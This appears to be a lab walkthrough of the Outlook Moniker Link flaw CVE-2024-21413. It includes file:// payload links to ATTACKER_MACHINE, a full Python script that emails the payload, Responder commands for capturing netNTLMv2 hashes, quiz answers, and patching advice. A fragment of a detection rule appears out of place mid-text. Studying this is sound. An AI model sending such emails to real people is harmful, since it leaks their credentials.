## Moniker Link (CVE-2024-21413)

On February 13th, 2024, Microsoft announced a Microsoft Outlook RCE & credential leak vulnerability with the assigned CVE of **CVE-2024-21413 (Moniker Link)**.  
Haifei Li of Check Point Research is credited with discovering the vulnerability.

This vulnerability bypasses Outlook's security mechanisms when handling a specific type of hyperlink known as a **Moniker Link**.  
An attacker can abuse this by sending an email containing a malicious Moniker Link to a victim, resulting in Outlook sending the user's **NTLM credentials** to the attacker once the hyperlink is clicked.

### 🔹 Moniker Link

- Outlook can render emails as HTML.  
- It can parse hyperlinks like HTTP/HTTPS, but also **Moniker Links**.  
- Normally, Outlook prompts a **Protected View warning** when external applications are triggered.  

Protected View: opens emails in **read-only mode** to block risky elements like macros.  

Example of Moniker Link:

```html
<p><a href="file://ATTACKER_MACHINE/test">Click me</a></p>
````

Bypassing Protected View using `!`:

```html
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
```

✅ Even if the share does not exist, an **authentication attempt** is still triggered, leaking the victim's **Windows netNTLMv2 hash**.

**Q\&A**

* **What Moniker Link type do we use in the hyperlink?**
  `file://`

* **What is the special character used to bypass Outlook's "Protected View"?**
  `!`

### 🔹 Exploitation

The attack involves sending a crafted email with a Moniker Link that bypasses Outlook's Protected View.

#### PoC Code (exploit.py)

```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")

html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

msgHtml = MIMEText(html_content, 'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```

#### PoC Summary

* Uses attacker & victim email.
* Requires password (for lab: `attacker`).
* Contains malicious Moniker Link.
* Sends via SMTP server.


#### Starting Responder

```bash
root@attackbox:# responder -I ens5
```

*Output snippet:*

```
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  [+] Listening for events...
```


#### Running the Exploit

```bash
root@attackbox:# python3 exploit.py
Enter your attacker email password: attacker
Email delivered
```

✅ After clicking the email link, **Responder captures the netNTLMv2 hash**.


**Q\&A**

* **What is the name of the application that we use on the AttackBox to capture the user's hash?**
  `responder`

* **What type of hash is captured once the hyperlink in the email has been clicked?**
  `netNTLMv2`

   condition:
      filesize < 1000KB
      and all of ($a*)
      and 1 of ($xr*)
}
```

#### Wireshark

* SMB request from victim → attacker.
* Shows truncated **netNTLMv2 hash**.

---

### 🔹 Remediation

* Microsoft patched this in **February 2024 Patch Tuesday**.
* Update Office via Windows Update or Microsoft Update Catalog.

**Best Practices:**

* Do not click random/unsolicited links.
* Always preview links before clicking.
* Report suspicious emails.

⚠️ Since the vulnerability bypasses Protected View, **there is no Outlook config fix**. Blocking SMB may cause operational issues, but blocking at **firewall level** could be an option.
